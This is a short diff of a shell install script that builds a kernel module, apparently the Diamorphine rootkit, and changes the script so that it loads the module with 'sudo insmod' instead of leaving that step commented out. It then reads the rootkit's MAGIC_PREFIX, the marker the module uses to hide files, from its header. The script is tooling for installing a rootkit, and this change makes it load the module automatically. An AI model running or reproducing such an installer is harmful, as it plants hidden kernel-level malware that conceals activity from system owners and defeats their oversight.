@@ -2,10 +2,10 @@
 
 make
 
-koFile=diamorphine.ko
-hFile=diamorphine.h
-if test -f "$koFile"; then #testing if .ko was built properly
-    #sudo insmod "$koFile"
+koFile=$(ls *.ko)
+hFile=$(ls *.h)
+if test -f "$koFile"; then
+    sudo insmod "$koFile"
     magicPrefix=$(awk '/MAGIC_PREFIX/{print $3}' "$hFile" | tr -d '"')
     thisDirPath=$(pwd)
     thisDir=${PWD##*/}
